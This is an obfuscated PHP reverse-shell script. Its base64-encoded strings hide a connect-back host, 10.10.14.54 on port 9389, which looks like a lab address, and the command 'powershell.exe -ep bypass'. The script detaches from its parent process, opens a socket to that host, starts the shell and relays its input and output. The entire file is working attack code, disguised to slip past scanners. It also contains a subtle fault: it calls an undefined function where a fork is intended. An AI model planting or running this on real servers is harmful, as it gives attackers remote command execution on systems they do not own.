<?php set_time_limit(0);$e021321e8c168=base64_decode('MS4w');$x957b527bcfba=base64_decode('MTAuMTAuMTQuNTQ=');$h901555fb06e3=9389;$q377f14237299=1400;$nf540b509685f=null;$n3925aeaa169c=null;$j2591c98b7011=base64_decode('cG93ZXJzaGVsbC5leGUgLWVwIGJ5cGFzcw==');$y1f15fcf5421e=0;$qad42f6697b03=0;if(function_exists(base64_decode('cGNudGxfZm9yaw=='))){$e0db3209e1adc=ea615a97f401e();if($e0db3209e1adc==-1){f661507fe45b0(base64_decode('RVJST1I6IENhbid0IGZvcms='));exit(1);}if($e0db3209e1adc){exit(0);}if(posix_setsid()==-1){f661507fe45b0(base64_decode('RXJyb3I6IENhbid0IHNldHNpZCgp'));exit(1);}$y1f15fcf5421e=1;}else{f661507fe45b0(base64_decode('V0FSTklORzogRmFpbGVkIHRvIGRhZW1vbmlzZS4gIFRoaXMgaXMgcXVpdGUgY29tbW9uIGFuZCBub3QgZmF0YWwu'));}chdir(base64_decode('Lw=='));umask(0);$i317d37b0edc7=fsockopen($x957b527bcfba,$h901555fb06e3,$i70106d0d8215,$c809b1abe3f11,30);if(!$i317d37b0edc7){f661507fe45b0("$c809b1abe3f11 ($i70106d0d8215)");exit(1);}$p6e698426544e=array(0=>array(base64_decode('cGlwZQ=='),base64_decode('cg==')),1=>array(base64_decode('cGlwZQ=='),base64_decode('dw==')),2=>array(base64_decode('cGlwZQ=='),base64_decode('dw==')));$j5075140835d0=proc_open($j2591c98b7011,$p6e698426544e,$j24a9384d408f);if(!is_resource($j5075140835d0)){f661507fe45b0(base64_decode('RVJST1I6IENhbid0IHNwYXduIHNoZWxs'));exit(1);}stream_set_blocking($j24a9384d408f[0],0);stream_set_blocking($j24a9384d408f[1],0);stream_set_blocking($j24a9384d408f[2],0);stream_set_blocking($i317d37b0edc7,0);f661507fe45b0("Successfully opened reverse shell to $x957b527bcfba:$h901555fb06e3");while(1){if(feof($i317d37b0edc7)){f661507fe45b0(base64_decode('RVJST1I6IFNoZWxsIGNvbm5lY3Rpb24gdGVybWluYXRlZA=='));break;}if(feof($j24a9384d408f[1])){f661507fe45b0(base64_decode('RVJST1I6IFNoZWxsIHByb2Nlc3MgdGVybWluYXRlZA=='));break;}$mc91a2dab520e=array($i317d37b0edc7,$j24a9384d408f[1],$j24a9384d408f[2]);$k8d5832391afa=stream_select($mc91a2dab520e,$nf540b509685f,$n3925aeaa169c,null);if(in_array($i317d37b0edc7,$mc91a2dab520e)){if($qad42f6697b03)f661507fe45b0(base64_decode('U09DSyBSRUFE'));$ha43c1b0aa53a=fread($i317d37b0edc7,$q377f14237299);if($qad42f6697b03)f661507fe45b0("SOCK: $ha43c1b0aa53a");fwrite($j24a9384d408f[0],$ha43c1b0aa53a);}if(in_array($j24a9384d408f[1],$mc91a2dab520e)){if($qad42f6697b03)f661507fe45b0(base64_decode('U1RET1VUIFJFQUQ='));$ha43c1b0aa53a=fread($j24a9384d408f[1],$q377f14237299);if($qad42f6697b03)f661507fe45b0("STDOUT: $ha43c1b0aa53a");fwrite($i317d37b0edc7,$ha43c1b0aa53a);}if(in_array($j24a9384d408f[2],$mc91a2dab520e)){if($qad42f6697b03)f661507fe45b0(base64_decode('U1RERVJSIFJFQUQ='));$ha43c1b0aa53a=fread($j24a9384d408f[2],$q377f14237299);if($qad42f6697b03)f661507fe45b0("STDERR: $ha43c1b0aa53a");fwrite($i317d37b0edc7,$ha43c1b0aa53a);}}fclose($i317d37b0edc7);fclose($j24a9384d408f[0]);fclose($j24a9384d408f[1]);fclose($j24a9384d408f[2]);proc_close($j5075140835d0);function f661507fe45b0($rb45cffe084dd){if(!$y1f15fcf5421e){print"$rb45cffe084dd\n";}}?>